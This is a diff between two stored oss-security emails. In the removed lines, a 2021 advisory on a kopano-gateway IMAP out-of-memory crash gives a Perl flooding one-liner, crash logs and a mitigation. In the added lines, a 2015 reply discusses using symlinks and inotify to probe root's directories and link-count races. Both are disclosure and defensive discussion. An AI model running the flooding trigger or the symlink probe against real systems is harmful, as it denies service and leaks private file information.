@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1804" "Saturday" "1" "May" "2021" "17:07:37" "+0200" "Jan Engelhardt" "jengelh@inai.de" nil "41" "[oss-security] kopano-core 11.0.1.143: Remote DoS with resource exhaustion" nil nil nil "5" nil nil (number mark "U       jengelh@inai May  1   41/1804  " thread-indent "\"[oss-security] kopano-core 11.0.1.143: Remote DoS with resource exhaustion\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] kopano-core 11.0.1.143: Remote DoS with resource exhaustion" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3633" "Thursday" "23" "April" "2015" "20:24:41" "+0200" "Jann Horn" "jann@thejh.net" "<20150423182441.GB16300@pc.thejh.net>" "77" "Re: [oss-security] open(2) with side effects" nil nil nil "4" "2015042318:24:41" "[oss-security] open(2) with side effects" (number mark "        jann@thejh.n Apr 23   77/3633  " thread-indent "\"Re: [oss-security] open(2) with side effects\"\n") "<5538EEDB.50308@redhat.com>" ("<5538EEDB.50308@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 18271 invoked by uid 550); 1 May 2021 15:10:45 -0000
+Received: (qmail 20268 invoked by uid 550); 23 Apr 2015 18:24:54 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,56 +11,95 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 17536 invoked from network); 1 May 2021 15:07:49 -0000
-Date: Sat, 1 May 2021 17:07:37 +0200 (CEST)
-From: Jan Engelhardt <jengelh@inai.de>
-To: oss-security@lists.openwall.com
-Message-ID: <p883nn87-4nrq-8060-88p-70o27nr6n0r2@vanv.qr>
-User-Agent: Alpine 2.24 (LSU 510 2020-10-10)
+Received: (qmail 20247 invoked from network); 23 Apr 2015 18:24:54 -0000
+Message-ID: <20150423182441.GB16300@pc.thejh.net>
+References: <5538EEDB.50308@redhat.com>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8BIT
-Subject: [oss-security] kopano-core 11.0.1.143: Remote DoS with resource exhaustion
+Content-Type: multipart/signed; micalg=pgp-sha1;
+	protocol="application/pgp-signature"; boundary="OwLcNYc0lM97+oe1"
+Content-Disposition: inline
+In-Reply-To: <5538EEDB.50308@redhat.com>
+User-Agent: Mutt/1.5.23 (2014-03-12)
+Date: Thu, 23 Apr 2015 20:24:41 +0200
+From: Jann Horn <jann@thejh.net>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] open(2) with side effects
+To: oss-security@lists.openwall.com
+
+--OwLcNYc0lM97+oe1
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+
+On Thu, Apr 23, 2015 at 03:08:43PM +0200, Florian Weimer wrote:
+> How common are file names on Linux which, when just opened and closed
+> (maybe with fstat or fgetattr inbetween), trigger side effects, such as
+> tape rewind?
+>=20
+> Do we still have to guard against that?  Or is that a thing of the past?
+
+Well, opening anything creates an inotify event that can be observed by
+anyone with read access to the thing. So if I can make you open a symlink
+to "/root/.ssh/../../tmp/foobar" with root privileges, I can observe
+whether an IN_OPEN event happens on /tmp/foobar and deduce from that
+whether a folder /root/.ssh exists. As far as I know, there is no way to
+prevent that notification. So the fix is to never follow symlinks, or in
+other words, never use paths including slashes in syscalls that take a
+path and only open directories using "open(..., O_NOFOLLOW);fchdir(...)",
+I guess. (You can do the same attack by polling st_atime instead of using
+inotify, but that might not work depending on the mount options and
+whether O_NOATIME was used.)
 
 
-To the best of my knowledge, this is the initial publication,
-and there is no CVE number as of this time.
+> At least before containers, the risk is greatly reduced because /dev is
+> a separate file system these days, so you can only use symbolic links,
+
+As you said, containers complicate finding out where you are a bit, even
+if you're not inside one - see the recently updated getcwd(3) manpage
+(<http://man7.org/linux/man-pages/man2/getcwd.2.html>):
+
+       If the current directory is not below the root directory of the
+       current process (e.g., because the process set a new filesystem root
+       using chroot(2) without changing its current directory into the new
+       root), then, since Linux 2.6.36, the returned path will be prefixed
+       with the string "(unreachable)".  Such behavior can also be caused by
+       an unprivileged user by changing the current directory into another
+       mount namespace.  When dealing with paths from untrusted sources,
+       callers of these functions should consider checking whether the
+       returned path starts with '/' or '(' to avoid misinterpreting an
+       unreachable path as a relative path.
+
+But yeah, that also only applies if you follow symlinks somehow.
 
 
-# Affected versions
+> and those are more straightforward to deal with (hard links need O_PATH
+> for a race- and side-effect-free link count check).
 
-  * kopano-core 8.5 to 11.0.1.143
+You can do a race-free link count check? How does that work? As far as I
+know, an attacker could always just remove the dentry through which
+you're accessing the inode before the fstat() and put it back in place
+after fstat().
 
-The "kopano-gateway" program implements a network service for IMAP.
-By default, a generous buffer is allocated for string literals, so
-the service can be triggered to go into an out-of-memory condition.
-OOM appears to be handled (log msg with "Cannot allocate memory"),
-but not _consistently_, letting std::bad_alloc escape somewhere,
-terminating the process and denying further access to the service.
+--OwLcNYc0lM97+oe1
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: Digital signature
 
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-# Trigger
+iQIcBAEBAgAGBQJVOTjpAAoJED4KNFJOeCOo0iQQANU2nA3sgFv5vI/PTTHpEsvk
+OEXlzxZ+wCoWBeSgdrna27GiXKHB1CprxKdM8VOB+AwDM+gQjRhbbb86cJQk3Ilv
+JUopF5ed71DlVSD8H2Ycn65e48fsFFVKhQsRfhZoA78fCpN032d1IIJOxgEevoC0
+kFDEWBG8OKv/9LUx56EOQiCv2/nv+KXBzN1ZTot6iqpuTuwMUqw2ignvoCeWQSZx
+sfZ6p3r2lTvNptgkUNPzNCrw37klYP6zClHH4o1EB/vO7K2GMxfEUkgqu2XL/8VG
+RypfQ+KrAY3iBuKsRcLcIxbn8MedPA3G+DQ3L60b8b5tECUSlppb8koIi6TqGDYB
+YrU+PTruxLuGDHGVM5FJeNs5Y9I0bcHUDnDih34v743AFbpeNuV4dvy1lBsMbFPZ
+5bsmasaqMqZ5Lq6Qz8F8vu3iaaVlk6pYejWn7GlY7q0+eyT0KJL2Mwf6bkTZZt7R
+ph9Q0qk1PBm/1pAsHhIwc/Uur2iLsiXx+HOkNeuIHxeQrE3UJyPm3SUAu57zpfHC
+FuYPsMFy+De2YUKxDFc1X0+ggwNuxzvOWDpd0LyPXVn3jVxvksAndzh3gnEbfn0B
+tsGupYxUGbasYJu2oSy4dRmiZK+XDwlTAYa8h0XKrV300YDFkIXWGU00Xvzz+WJk
+HXVHHEKWeH/Iuu42QbbH
+=rOFm
+-----END PGP SIGNATURE-----
 
-» ./kopano-gateway -F &
-» perl -MIO::Socket::INET -e 
-  '$a="A"x65536;for(1..99){$s=IO::Socket::INET->new(PeerHost,"localhost",PeerPort,143);
-  $s->write("K {134217727}\r\n");$s->write($a) for 1..2048;push@k,$s;}'
-
-2021-05-01T17:00:03.424598: [error  ] Failed to read line: Cannot allocate memory
-2021-05-01T17:00:40.489165: [crit   ] ----------------------------------------------------------------------
-2021-05-01T17:00:40.489174: [crit   ] Fatal error detected. Please report all following information.
-2021-05-01T17:00:40.489186: [crit   ] kopano-dagent 11.0.1
-2021-05-01T17:00:40.489210: [crit   ] OS: openSUSE Tumbleweed (Linux 5.12.0-3.g6208a83-default x86_64)
-2021-05-01T17:00:40.489217: [crit   ] Thread name: kopano-gateway
-2021-05-01T17:00:40.489429: [crit   ] Peak RSS: 3056660
-2021-05-01T17:00:40.489444: [crit   ] Pid 31604 caught SIGABRT (6), out of memory or unhandled exception, traceback:
-terminate called after throwing an instance of 'std::bad_alloc'
-  what():  std::bad_alloc
-
-
-# Mitigation
-
-A reduction of the buffer (gateway.cfg:imap_max_messagesize) is 
-possible, but this administrative action equally implies a reduction of 
-the service capabilities offered to end-users (and may be unpopular).
+--OwLcNYc0lM97+oe1--
